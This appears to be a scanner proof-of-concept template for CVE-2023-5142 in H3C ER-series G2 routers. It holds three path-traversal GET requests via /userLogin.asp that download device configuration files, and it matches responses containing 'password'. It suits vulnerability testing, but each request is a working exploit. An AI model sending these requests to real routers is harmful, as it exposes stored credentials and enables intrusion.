[info]
id = "POC-AVE-2023-0004"
name = "H3C ER3200G2 信息泄露漏洞 PoC"
author = "AVE"
severity = "medium"
tags = ["信息泄露", "路径遍历"]
description = "H3C ER系列G2路由器路径遍历漏洞，通过 /userLogin.asp 路径遍历下载配置文件，验证是否存在信息泄露"
vuln_id = ["CVE-2023-5142", "AVE-2023-0004"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/userLogin.asp/../actionpolicy_status/../ER3200G2.cfg"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["password"]
expect = true

[[poc.requests]]
method = "GET"
path = "/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["password"]
expect = true

[[poc.requests]]
method = "GET"
path = "/userLogin.asp/../actionpolicy_status/../ER2200G2.cfg"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["password"]
expect = true
